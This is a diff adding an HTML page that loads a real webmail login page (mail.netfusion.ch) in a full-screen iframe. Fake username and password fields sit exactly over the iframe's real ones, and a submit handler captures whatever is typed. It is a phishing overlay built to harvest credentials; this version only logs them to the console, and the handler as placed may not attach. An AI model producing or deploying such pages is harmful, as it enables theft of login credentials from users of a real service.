@@ -1,0 +1,56 @@
+<html>
+    <head>
+        <script type="text/javascript">
+            window.addEventListener("DOMContentLoaded", function(){
+                var iframe = document.createElement("iframe");
+                iframe.width = "100%";
+                iframe.height = "100%";
+                iframe.src = "https://mail.netfusion.ch/Login.aspx";
+                document.body.appendChild(iframe);
+            });
+            document.getElementById("form123").onsubmit = function(event) {
+                event.preventDefault();
+                var userAndPassword = {
+                    user: document.getElementById("username").value,
+                    password: document.getElementById("password").value
+                }
+                console.log(userAndPassword);
+            }
+        </script>
+        <style>
+          input.button {
+            border-color: #b3b3b3;
+            border-style: solid;
+            border-width: 1px;
+            display: inline-block;
+            color: #343434;
+            white-space: nowrap;
+            text-decoration: none;
+            outline: none;
+            background: #eee;
+            background: -webkit-linear-gradient(top,#f8f8f8 40%,#dfdfdf 90%);
+            background: -moz-linear-gradient(top,#f8f8f8 40%,#dfdfdf 90%);
+            background: -o-linear-gradient(top,#f8f8f8 40%,#dfdfdf 90%);
+            background: -ms-linear-gradient(top,#f8f8f8 40%,#dfdfdf 90%);
+            border-radius: 5px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            -ms-border-radius: 5px;
+            position: relative;
+            font-size: 0.75em;
+            line-height: 2;
+            text-shadow: 0 1px 1px white;
+            padding: 0 10px;
+            margin-left: 5px;
+          }
+        </style>
+    </head>
+    <body style="margin:0">
+        <form id="form123" style="margin:0">
+            <input id="username" type="text" style="position:fixed; top:29.8%; left: 38.35%; width:320px; height:25px">
+            <input id="password" type="password" style="position:fixed; top:36.8%; left: 38.35%; width:320px; height:25px">
+            <input type="submit" class="button" style="position:fixed; top:45.5%; left: 57.85%; width:50px; height:25px" value="Login">
+        </form>
+
+    </body>
+</html>
